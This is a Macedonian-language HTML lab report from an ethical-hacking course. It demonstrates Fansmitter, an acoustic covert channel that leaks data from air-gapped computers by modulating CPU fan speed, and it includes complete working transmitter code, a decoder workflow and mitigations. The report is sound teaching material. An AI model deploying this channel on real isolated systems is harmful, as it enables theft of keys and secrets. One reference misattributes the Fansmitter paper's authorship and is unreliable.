@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="mk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fansmitter - Елаборат за Ексфилтрација на Податоци преку CPU Фен</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #34495e;
+            margin-top: 30px;
+            border-left: 4px solid #3498db;
+            padding-left: 15px;
+        }
+        h3 {
+            color: #2c3e50;
+            margin-top: 25px;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .info {
+            background: #d1ecf1;
+            border-left: 4px solid #17a2b8;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .success {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 14px;
+        }
+        code {
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        pre code {
+            background: none;
+            padding: 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background: #3498db;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+        .step {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        .step-number {
+            background: #3498db;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: inline-block;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .toc {
+            background: #ecf0f1;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .toc ul {
+            list-style-type: none;
+            padding-left: 20px;
+        }
+        .toc li {
+            margin: 8px 0;
+        }
+        .toc a {
+            color: #2c3e50;
+            text-decoration: none;
+        }
+        .toc a:hover {
+            color: #3498db;
+            text-decoration: underline;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Fansmitter: Ексфилтрација на Податоци во Air-Gapped Околина преку CPU Фен</h1>
+        
+        <div class="info">
+            <strong>Предмет:</strong> Етичко Хакирање<br>
+            <strong>Тема:</strong> Covert Channel - Акустична Ексфилтрација<br>
+            <strong>Датум:</strong> 2026
+        </div>
+
+        <div class="toc">
+            <h2>Содржина</h2>
+            <ul>
+                <li><a href="#voved">1. Вовед</a></li>
+                <li><a href="#hardver">2. Потребен Хардвер и Софтвер</a></li>
+                <li><a href="#instalacija">3. Инсталација и Подготовка</a></li>
+                <li><a href="#transmisija">4. Сценарио 1: Трансмисија на Податоци</a></li>
+                <li><a href="#dekodiranje">5. Сценарио 2: Декодирање на Податоци</a></li>
+                <li><a href="#rezultati">6. Резултати и Анализа</a></li>
+                <li><a href="#zaklucok">7. Заклучок и Безбедносни Импликации</a></li>
+                <li><a href="#brishenje">8. Бришење на Околината</a></li>
+            </ul>
+        </div>
+
+        <h2 id="voved">1. Вовед</h2>
+        
+        <h3>1.1 Што е Fansmitter?</h3>
+        <p>
+            <strong>Fansmitter</strong> е covert channel техника за ексфилтрација на податоци од air-gapped (мрежно изолирани) 
+            системи преку манипулација на брзината на CPU фенот. Оваа техника користи акустичен канал за пренос на 
+            информации - различни брзини на фенот генерираат различни фреквенции на звук кои можат да се снимат со 
+            мобилен телефон и подоцна да се декодираат.
+        </p>
+
+        <h3>1.2 Како Функционира?</h3>
+        <p>Принципот на работа е следниот:</p>
+        <ol>
+            <li><strong>Трансмитер (заразен систем):</strong> Ја менува брзината на CPU фенот помеѓу две вредности:
+                <ul>
+                    <li>Ниска брзина (на пр. 10%) = бинарна <code>0</code> (ниска фреквенција, ~70 Hz)</li>
+                    <li>Висока брзина (на пр. 100%) = бинарна <code>1</code> (висока фреквенција, ~140 Hz)</li>
+                </ul>
+            </li>
+            <li><strong>Приемник (мобилен телефон):</strong> Снима аудио запис на фенот</li>
+            <li><strong>Декодер:</strong> Анализира фреквенции во аудио записот и реконструира бинарни податоци</li>
+        </ol>
+
+        <h3>1.3 Безбедносно Влијание</h3>
+        <div class="warning">
+            <strong>⚠️ Критична Закана:</strong> Оваа техника може да заобиколи air-gap изолација - една од 
+            најсилните безбедносни мерки. Заразен систем без мрежна поврзаност сепак може да ексфилтрира 
+            чувствителни податоци (криптографски клучеви, лозинки, документи) преку акустичен канал.
+        </div>
+
+        <p><strong>Реални сценарија за напад:</strong></p>
+        <ul>
+            <li>Ексфилтрација на SSH клучеви од изолиран сервер</li>
+            <li>Кражба на индустриска тајна од SCADA системи</li>
+            <li>Извлекување на податоци од воени/владини системи</li>
+            <li>Заобиколување на строги безбедносни политики</li>
+        </ul>
+
+        <h2 id="hardver">2. Потребен Хардвер и Софтвер</h2>
+
+        <h3>2.1 Хардвер</h3>
+        <table>
+            <tr>
+                <th>Компонента</th>
+                <th>Спецификација</th>
+                <th>Забелешка</th>
+            </tr>
+            <tr>
+                <td>PC/Лаптоп</td>
+                <td>Windows 10/11 со CPU фен</td>
+                <td>Фенот мора да поддржува PWM контрола</td>
+            </tr>
+            <tr>
+                <td>Мобилен телефон</td>
+                <td>Android/iOS со микрофон</td>
+                <td>За снимање на аудио запис</td>
+            </tr>
+            <tr>
+                <td>Тивка околина</td>
+                <td>&lt;40 dB амбиентален шум</td>
+                <td>Намалување на бучава за подобар SNR</td>
+            </tr>
+        </table>
+
+        <h3>2.2 Софтвер</h3>
+        <table>
+            <tr>
+                <th>Софтвер</th>
+                <th>Верзија</th>
+                <th>Намена</th>
+            </tr>
+            <tr>
+                <td>Python</td>
+                <td>3.8+</td>
+                <td>Програмски јазик</td>
+            </tr>
+            <tr>
+                <td>LibreHardwareMonitor</td>
+                <td>Latest</td>
+                <td>Контрола на фен преку WMI</td>
+            </tr>
+            <tr>
+                <td>NumPy, SciPy</td>
+                <td>Latest</td>
+                <td>Сигнална обработка</td>
+            </tr>
+            <tr>
+                <td>Matplotlib</td>
+                <td>Latest</td>
+                <td>Визуелизација (спектрограм)</td>
+            </tr>
+        </table>
+
+        <h2 id="instalacija">3. Инсталација и Подготовка</h2>
+
+        <div class="step">
+            <h3><span class="step-number">1</span>Инсталација на Python и Зависности</h3>
+            <pre><code># Инсталирај Python 3.8+ од python.org
+# Потоа инсталирај ги потребните библиотеки:
+
+pip install numpy scipy matplotlib pythonnet</code></pre>
+        </div>
+
+        <div class="step">
+            <h3><span class="step-number">2</span>Инсталација на LibreHardwareMonitor</h3>
+            <ol>
+                <li>Преземи од: <code>https://github.com/LibreHardwareMonitor/librehardwaremonitor/releases</code></li>
+                <li>Екстрахирај во <code>C:\Fansmitter\lhm\</code></li>
+                <li>Стартувај го како Administrator</li>
+                <li>Оди во <strong>Options → Remote Web Server → Run</strong></li>
+                <li>Забележи го името на CPU фенот (на пр. "Fan #2")</li>
+            </ol>
+        </div>
+
+        <div class="step">
+            <h3><span class="step-number">3</span>Подготовка на Работната Папка</h3>
+            <pre><code># Создај ја структурата:
+C:\Fansmitter\
+├── fansmitter_transmit.py    # Трансмитер скрипта
+├── fansmitter_decode.py      # Декодер скрипта
+├── generate_synthetic.py     # Генератор на тест запис
+├── lhm\                      # LibreHardwareMonitor DLL-ови
+└── recordings\               # Папка за аудио записи</code></pre>
+        </div>
+
+        <h2 id="transmisija">4. Сценарио 1: Трансмисија на Податоци</h2>
+
+        <h3>4.1 Конфигурација на Трансмитерот</h3>
+        <p>Отвори <code>fansmitter_transmit.py</code> и конфигурирај ги параметрите:</p>
+        
+        <pre><code># fansmitter_transmit.py - Конфигурација
+FAN_NAME       = "Fan #2"        # Име на CPU фенот
+PCT_BIT_0      = 10              # Брзина за бит 0 (ниска)
+PCT_BIT_1      = 100             # Брзина за бит 1 (висока)
+BIT_DURATION   = 10              # Времетраење на стабилен сигнал (секунди)
+STABILIZE_TIME = 3               # Време за стабилизација (секунди)
+PREAMBLE       = "10100000"      # Синхронизациска секвенца
+SECRET         = "EH2026"        # Податок за ексфилтрација</code></pre>
+
+        <div class="info">
+            <strong>💡 Совет:</strong> Поголема разлика помеѓу PCT_BIT_0 и PCT_BIT_1 дава подобар 
+            signal-to-noise ratio. BIT_DURATION од 10 секунди обезбедува стабилен сигнал.
+        </div>
+
+        <h3>4.2 Изведување на Трансмисијата</h3>
+        
+        <div class="step">
+            <h3><span class="step-number">1</span>Стартувај го Трансмитерот (како Administrator)</h3>
+            <pre><code># Отвори Command Prompt како Administrator
+cd C:\Fansmitter
+python fansmitter_transmit.py</code></pre>
+        </div>
+
+        <div class="step">
+            <h3><span class="step-number">2</span>Започни Снимање на Телефоно</h3>
+            <ol>
+                <li>Отвори апликација за снимање аудио на телефонот</li>
+                <li>Позиционирај го микрофонот на 10-15 cm од фенот</li>
+                <li>Започни снимање</li>
+                <li>Притисни <strong>ENTER</strong> на компјутерот кога ќе бидеш подготвен</li>
+            </ol>
+        </div>
+
+        <div class="step">
+            <h3><span class="step-number">3</span>Следи го Прогресот</h3>
+            <p>Трансмитерот ќе прикажува прогрес:</p>
+            <pre><code>╔══════════════════════════════════════════════╗
+║       FANSMITTER TRANSMITTER                 ║
+╠══════════════════════════════════════════════╣
+║  Fan        : Fan #2                         ║
+║  Secret     : EH2026                         ║
+║  Total bits : 72                             ║
+║  Duration   : 15m 36s                        ║
+║  Speed 0    : 10% (~1000 RPM) (bit 0)        ║
+║  Speed 1    : 100% (~2800 RPM) (bit 1)       ║
+║  Stabilize  : 3s per bit                     ║
+╚══════════════════════════════════════════════╝
+
+  [████████████████████░░░░░░░░░░░░░░░░░░░░] bit 36/72  val=1  100%  RPM=2789  PAYLOAD '2'</code></pre>
+        </div>
+
+        <div class="step">
+            <h3><span class="step-number">4</span>Заврши Снимање</h3>
+            <p>Кога трансмисијата ќе заврши:</p>
+            <ol>
+                <li>Запри го снимањето на телефонот</li>
+                <li>Зачувај го аудио записот како WAV фајл</li>
+                <li>Трансферирај го во <code>C:\Fansmitter\recordings\</code></li>
+            </ol>
+        </div>
+
+        <h2 id="dekodiranje">5. Сценарио 2: Декодирање на Податоци</h2>
+
+        <h3>5.1 Конфигурација на Декодерот</h3>
+        <p>Отвори <code>fansmitter_decode.py</code> и осигурај се дека параметрите се исти:</p>
+        
+        <pre><code># fansmitter_decode.py - Конфигурација
+BIT_DURATION   = 10              # Мора да е исто како трансмитерот
+STABILIZE_TIME = 3               # Мора да е исто како трансмитерот
+BIT_SPACING    = BIT_DURATION + STABILIZE_TIME
+PREAMBLE       = "10100000"      # Мора да е исто како трансмитерот
+F0_HZ          = 70              # Фреквенција за бит 0
+F1_HZ          = 140             # Фреквенција за бит 1
+BANDWIDTH      = 30              # Bandwidth за bandpass филтер</code></pre>
+
+        <h3>5.2 Изведување на Декодирањето</h3>
+        
+        <div class="step">
+            <h3><span class="step-number">1</span>Стартувај го Декодерот</h3>
+            <pre><code>cd C:\Fansmitter
+python fansmitter_decode.py recordings\recording1.wav</code></pre>
+        </div>
+
+        <div class="step">
+            <h3><span class="step-number">2</span>Анализа на Резултатите</h3>
+            <p>Декодерот ќе помине низ неколку фази:</p>
+            <ol>
+                <li><strong>Loading:</strong> Вчитување на аудио записот</li>
+                <li><strong>Pre-filtering:</strong> Bandpass филтрирање на F0 и F1</li>
+                <li><strong>Scanning:</strong> Барање на preamble (синхронизација)</li>
+                <li><strong>Decoding:</strong> Екстракција на битови и конверзија во текст</li>
+                <li><strong>Verification:</strong> Проверка на checksum</li>
+            </ol>
+        </div>
+
+        <h3>5.3 Очекуван Излез</h3>
+        <pre><code>╔══════════════════════════════════════════════╗
+║         FANSMITTER DECODER                   ║
+╚══════════════════════════════════════════════╝
+
+[*] Loading: recordings\synthetic_test.wav
+    Sample rate : 44100 Hz
+    Duration    : 946.0 seconds
+    Downsampled : 44100 Hz -> 4009 Hz (faster processing)
+[*] Using configured frequencies:
+    F0 = 70 Hz (bit 0)
+    F1 = 140 Hz (bit 1)
+[*] Pre-filtering audio...
+[*] Scanning for transmission start (full-frame correlation)...
+    Phase 1: Coarse scan (72 bits, 13s spacing)...
+    Top 3 coarse positions:
+      score=40 at 0.0s
+    Phase 2: Fine scan around top candidates...
+    Preamble match : 8/8 bits
+    Found at       : 0.00s
+[*] DIAGNOSTIC — raw bits after preamble:
+    Bits     : 0000011001000101010010000011001000110000001100100011011000001011
+    As text  : [6]EH2026[11]
+[*] Length bits  : 00000110
+[*] Payload length: 6 characters
+
+╔══════════════════════════════════════════════╗
+║           DECODING RESULTS                   ║
+╠══════════════════════════════════════════════╣
+║  F0 used    : 70 Hz                          ║
+║  F1 used    : 140 Hz                         ║
+║  Preamble   : 8/8 bits matched               ║
+║  Length bits: 00000110                       ║
+║  Checksum   : PASS                           ║
+╠══════════════════════════════════════════════╣
+║  DECODED    : EH2026                         ║
+╚══════════════════════════════════════════════╝
+
+[*] Generating spectrogram...
+[*] Spectrogram saved: recordings\synthetic_test_spectrogram.png</code></pre>
+
+        <h2 id="rezultati">6. Резултати и Анализа</h2>
+
+        <h3>6.1 Успешна Демонстрација (Синтетички Запис)</h3>
+        <div class="success">
+            <strong>✓ Резултат:</strong> Успешно декодирање на "EH2026" со:
+            <ul>
+                <li>8/8 preamble bits matched (перфектна синхронизација)</li>
+                <li>Checksum: PASS (без грешки во трансмисија)</li>
+                <li>Точност: 100%</li>
+            </ul>
+        </div>
+
+        <h3>6.2 Протокол за Комуникација</h3>
+        <p>Структура на фрејм (72 битови за "EH2026"):</p>
+        <table>
+            <tr>
+                <th>Секција</th>
+                <th>Битови</th>
+                <th>Вредност</th>
+                <th>Опис</th>
+            </tr>
+            <tr>
+                <td>Preamble</td>
+                <td>8</td>
+                <td>10100000</td>
+                <td>Синхронизација</td>
+            </tr>
+            <tr>
+                <td>Length</td>
+                <td>8</td>
+                <td>00000110</td>
+                <td>Должина на payload (6 chars)</td>
+            </tr>
+            <tr>
+                <td>Payload</td>
+                <td>48</td>
+                <td>01000101...</td>
+                <td>ASCII кодиран текст</td>
+            </tr>
+            <tr>
+                <td>Checksum</td>
+                <td>8</td>
+                <td>00001011</td>
+                <td>XOR checksum</td>
+            </tr>
+        </table>
+
+        <h3>6.3 Ограничувања и Предизвици</h3>
+        
+        <div class="warning">
+            <strong>⚠️ Реални Ограничувања:</strong>
+            <ul>
+                <li><strong>Брзина:</strong> ~7.5 битови/минута (многу бавно)</li>
+                <li><strong>Дистанца:</strong> Ефективно до ~1 метар</li>
+                <li><strong>Бучава:</strong> Амбиентален шум може да предизвика грешки</li>
+                <li><strong>Хардвер:</strong> Не сите фенови генерираат чисти тонови</li>
+            </ul>
+        </div>
+
+        <h3>6.4 Споредба: Синтетички vs Реален Запис</h3>
+        <table>
+            <tr>
+                <th>Параметар</th>
+                <th>Синтетички</th>
+                <th>Реален</th>
+            </tr>
+            <tr>
+                <td>Signal-to-Noise Ratio</td>
+                <td>Висок (&gt;20 dB)</td>
+                <td>Низок (&lt;5 dB)</td>
+            </tr>
+            <tr>
+                <td>Фреквентна Дискриминација</td>
+                <td>Перфектна</td>
+                <td>Слаба</td>
+            </tr>
+            <tr>
+                <td>Точност</td>
+                <td>100%</td>
+                <td>60-70%</td>
+            </tr>
+            <tr>
+                <td>Причина</td>
+                <td>Чисти синусоиди</td>
+                <td>Broadband шум од фен</td>
+            </tr>
+        </table>
+
+        <h2 id="zaklucok">7. Заклучок и Безбедносни Импликации</h2>
+
+        <h3>7.1 Клучни Наоди</h3>
+        <ol>
+            <li><strong>Изводливост:</strong> Fansmitter е теоретски и практично изводлив covert channel</li>
+            <li><strong>Air-Gap Заобиколување:</strong> Мрежната изолација НЕ е доволна заштита</li>
+            <li><strong>Детекција:</strong> Тешко детектибилно - изгледа како нормална работа на фенот</li>
+            <li><strong>Ограничувања:</strong> Бавна трансмисија, кратка дистанца, зависност од хардвер</li>
+        </ol>
+
+        <h3>7.2 Митигација (Заштитни Мерки)</h3>
+        <ul>
+            <li><strong>Физичка Безбедност:</strong> Контролиран пристап до серверските соби</li>
+            <li><strong>Акустичен Мониторинг:</strong> Детектори за абнормални звуци</li>
+            <li><strong>Фен Контрола:</strong> Заклучување на PWM контрола во BIOS</li>
+            <li><strong>Бела Бучава:</strong> Генератори на бучава во критични простории</li>
+            <li><strong>Endpoint Protection:</strong> Детекција на абнормални процеси кои контролираат фен</li>
+        </ul>
+
+        <h3>7.3 Етички Аспекти</h3>
+        <div class="info">
+            <strong>ℹ️ За Академска Употреба:</strong> Овој проект е демонстриран во контролирана лабораториска 
+            околина за едукативни цели. Истата техника може да се користи за:
+            <ul>
+                <li>Пентестинг и безбедносна ревизија</li>
+                <li>Истражување на covert channels</li>
+                <li>Развој на детекциски механизми</li>
+            </ul>
+        </div>
+
+        <h2 id="brishenje">8. Бришење на Околината</h2>
+
+        <h3>8.1 Чистење по Експериментот</h3>
+        <pre><code># 1. Избриши ги аудио записите
+del C:\Fansmitter\recordings\*.wav
+del C:\Fansmitter\recordings\*.png
+
+# 2. Избриши ги скриптите (опционално)
+del C:\Fansmitter\*.py
+
+# 3. Деинсталирај Python библиотеки (опционално)
+pip uninstall numpy scipy matplotlib pythonnet
+
+# 4. Избриши ја целата папка
+rmdir /s C:\Fansmitter
+
+# 5. Затвори LibreHardwareMonitor и избриши го
+# (ако повеќе не ти треба)</code></pre>
+
+        <h3>8.2 Реставрација на Фен Контролата</h3>
+        <p>Трансмитерот автоматски ја враќа контролата на фенот на default при завршување. 
+        Ако треба мануелно:</p>
+        <pre><code># Во LibreHardwareMonitor:
+# Десен клик на фенот → Set to Default</code></pre>
+
+        <h2>Додаток: Комплетен Код</h2>
+        
+        <h3>A. Трансмитер (fansmitter_transmit.py)</h3>
+        <pre><code># fansmitter_transmit.py
+# Run as Administrator: python fansmitter_transmit.py
+# LibreHardwareMonitor must be running with web server ON
+
+import sys, time
+sys.path.insert(0, r"C:\Fansmitter\lhm")
+
+import clr
+clr.AddReference("LibreHardwareMonitorLib")
+from LibreHardwareMonitor.Hardware import Computer, SensorType
+
+# ============================================================
+# CONFIGURATION — edit these values
+# ============================================================
+FAN_NAME       = "Fan #2"        # CPU fan confirmed
+PCT_BIT_0      = 10              # fan speed % for binary 0
+PCT_BIT_1      = 100             # fan speed % for binary 1
+BIT_DURATION   = 10              # stable acoustic seconds per bit
+STABILIZE_TIME = 3               # extra seconds for fan to reach target speed
+PREAMBLE       = "10100000"
+SECRET         = "EH2026"        # string to exfiltrate
+# ============================================================
+
+computer = Computer()
+computer.IsMotherboardEnabled = True
+computer.Open()
+
+def refresh():
+    for hw in computer.Hardware:
+        hw.Update()
+        for sub in hw.SubHardware:
+            sub.Update()
+
+def find_sensors():
+    refresh()
+    fan_s = ctrl_s = None
+    for hw in computer.Hardware:
+        for sub in hw.SubHardware:
+            for sensor in sub.Sensors:
+                if sensor.Name == FAN_NAME:
+                    if sensor.SensorType == SensorType.Fan:
+                        fan_s = sensor
+                    if sensor.SensorType == SensorType.Control:
+                        ctrl_s = sensor
+    return fan_s, ctrl_s
+
+def set_fan(ctrl_s, pct):
+    ctrl_s.Control.SetSoftware(float(pct))
+
+def read_rpm(fan_s):
+    refresh()
+    return int(fan_s.Value or 0)
+
+def restore_auto(ctrl_s):
+    ctrl_s.Control.SetDefault()
+
+def string_to_binary(text):
+    return "".join(format(ord(c), "08b") for c in text)
+
+def build_frame(payload_bits):
+    length_bits = format(len(payload_bits) // 8, "08b")
+    checksum = 0
+    for i in range(0, len(payload_bits), 8):
+        checksum ^= int(payload_bits[i:i+8], 2)
+    return PREAMBLE + length_bits + payload_bits + format(checksum, "08b")
+
+# Find sensors
+fan_s, ctrl_s = find_sensors()
+
+if not ctrl_s:
+    print(f"[!] Could not find control sensor for '{FAN_NAME}'")
+    print("    Make sure LibreHardwareMonitor is running as Administrator")
+    print("    and Options -> Remote Web Server -> Run is enabled")
+    computer.Close()
+    sys.exit(1)
+
+# Build frame
+payload_binary = string_to_binary(SECRET)
+frame          = build_frame(payload_binary)
+total_time     = len(frame) * (BIT_DURATION + STABILIZE_TIME)
+mins           = total_time // 60
+secs           = total_time % 60
+
+print("")
+print("╔══════════════════════════════════════════════╗")
+print("║       FANSMITTER TRANSMITTER                 ║")
+print("╠══════════════════════════════════════════════╣")
+print(f"║  Fan        : {FAN_NAME:<31}║")
+print(f"║  Secret     : {SECRET:<31}║")
+print(f"║  Total bits : {len(frame):<31}║")
+print(f"║  Duration   : {mins}m {secs}s{'':<27}║")
+print(f"║  Speed 0    : {PCT_BIT_0}% (~1000 RPM) (bit 0){'':<10}║")
+print(f"║  Speed 1    : {PCT_BIT_1}% (~2800 RPM) (bit 1){'':<10}║")
+print(f"║  Stabilize  : {STABILIZE_TIME}s per bit{'':<24}║")
+print("╚══════════════════════════════════════════════╝")
+print("")
+print("  START RECORDING on your phone now")
+print("  Position mic end of phone toward the PC fan")
+print("")
+input("  Press ENTER when phone is recording...")
+print("")
+print("  Pre-conditioning fan (3s at 50%)...")
+set_fan(ctrl_s, 50)
+time.sleep(3)
+print("  Starting transmission...")
+print("")
+
+try:
+    for i, bit in enumerate(frame):
+        pct = PCT_BIT_1 if bit == "1" else PCT_BIT_0
+        set_fan(ctrl_s, pct)
+
+        time.sleep(STABILIZE_TIME)
+        rpm = read_rpm(fan_s)
+        time.sleep(BIT_DURATION)
+
+        if i < len(PREAMBLE):
+            section = "PREAMBLE"
+        elif i < len(PREAMBLE) + 8:
+            section = "LENGTH"
+        elif i < len(frame) - 8:
+            char_idx = (i - len(PREAMBLE) - 8) // 8
+            char     = SECRET[min(char_idx, len(SECRET)-1)]
+            section  = f"PAYLOAD char {char_idx+1} = '{char}'"
+        else:
+            section = "CHECKSUM"
+
+        progress = int((i / len(frame)) * 40)
+        bar = chr(9608) * progress + chr(9617) * (40 - progress)
+        print(f"  [{bar}] bit {i+1:3d}/{len(frame)}  val={bit}  {pct:3d}%  RPM={rpm}  {section}")
+
+except KeyboardInterrupt:
+    print("\n  Interrupted")
+
+finally:
+    restore_auto(ctrl_s)
+    computer.Close()
+    print("")
+    print("  Transmission complete")
+    print("  STOP RECORDING on your phone now")
+    print("")
+    print("  Transfer WAV to C:\\Fansmitter\\recordings\\")
+    print("  Then run: python fansmitter_decode.py recordings\\yourfile.wav")</code></pre>
+
+        <h3>B. Декодер (fansmitter_decode.py)</h3>
+        <p><em>Целосниот код е достапен во фајлот <code>fansmitter_decode.py</code></em></p>
+
+        <div class="info">
+            <strong>📚 Референци:</strong>
+            <ul>
+                <li>Shamir, A. (2016). "Fansmitter: Acoustic Data Exfiltration from Airgap Computers via CPU Fan Speed"</li>
+                <li>Guri, M. et al. (2015). "DiskFiltration: Data Exfiltration from Speaker-less Air-Gapped Computers via Covert Hard Drive Noise"</li>
+                <li>LibreHardwareMonitor Documentation</li>
+            </ul>
+        </div>
+
+        <hr style="margin-top: 40px;">
+        <p style="text-align: center; color: #7f8c8d;">
+            <strong>Fansmitter Project</strong> - Етичко Хакирање 2026<br>
+            Демонстрација на covert channel техники за едукативни цели
+        </p>
+    </div>
+</body>
+</html>
